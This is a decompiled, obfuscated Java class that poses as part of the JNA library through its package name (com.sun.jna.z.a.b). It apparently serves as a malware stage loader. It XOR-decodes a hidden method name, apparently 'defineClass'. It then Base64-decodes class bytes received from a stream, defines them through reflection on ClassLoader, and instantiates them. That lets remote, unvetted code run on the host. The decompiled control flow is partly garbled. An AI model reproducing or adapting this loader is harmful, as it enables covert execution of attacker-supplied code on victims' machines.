package com.sun.jna.z.a.b;

import com.sun.jna.z.*;
import com.sun.jna.z.a.e.*;
import com.sun.jna.z.a.*;
import java.lang.reflect.*;
import java.util.*;

public class d
{
    e a;
    private static final String b;
    
    public d(final e a) {
        this.a = a;
    }
    
    public void a() {
        final int e = com.sun.jna.z.a.b.e.e;
        this.a.a(15);
        final int a = e;
        final int a2 = Integer.parseInt(this.a.b());
        int a3 = 0;
        while (a3 < a2) {
            final String a4 = this.a.c();
            final byte[] a5 = this.b();
            this.a(a5, a4);
            ++a3;
            if (a != 0) {
                break;
            }
        }
    }
    
    void a(final byte[] a, final String a) {
        try {
            final Method a2 = ClassLoader.class.getDeclaredMethod(d.b, String.class, byte[].class, Integer.TYPE, Integer.TYPE);
            a2.setAccessible(true);
            final Class a3 = (Class)a2.invoke(Main.c.a, a, a, 0, a.length);
            if (a.contains("$")) {
                return;
            }
            final Constructor a4 = a3.getDeclaredConstructors()[0];
            final c a5 = a4.newInstance(new Object[0]);
            i.d.a.a(a5);
        }
        catch (Exception a6) {
            a6.printStackTrace();
        }
    }
    
    byte[] b() {
        return Base64.getDecoder().decode(com.sun.jna.z.a.b.a.b(this.a.b()));
    }
    
    static {
        final char[] charArray = "\u00e5\\\u0098\u00ed\u0006\u000f\u00e8\u00edX\u008d\u00f7".toCharArray();
        int length;
        int n2;
        final int n = n2 = (length = charArray.length);
        int n3 = 0;
        while (true) {
            Label_0124: {
                if (n > 1) {
                    break Label_0124;
                }
                length = (n2 = n3);
                do {
                    final char c = charArray[n2];
                    char c2 = '\0';
                    switch (n3 % 7) {
                        case 0: {
                            c2 = '\u0081';
                            break;
                        }
                        case 1: {
                            c2 = '9';
                            break;
                        }
                        case 2: {
                            c2 = '\u00fe';
                            break;
                        }
                        case 3: {
                            c2 = '\u0084';
                            break;
                        }
                        case 4: {
                            c2 = 'h';
                            break;
                        }
                        case 5: {
                            c2 = 'j';
                            break;
                        }
                        default: {
                            c2 = '«';
                            break;
                        }
                    }
                    charArray[length] = (char)(c ^ c2);
                    ++n3;
                } while (n == 0);
            }
            if (n <= n3) {
                b = new String(charArray).intern();
                return;
            }
            continue;
        }
    }
}
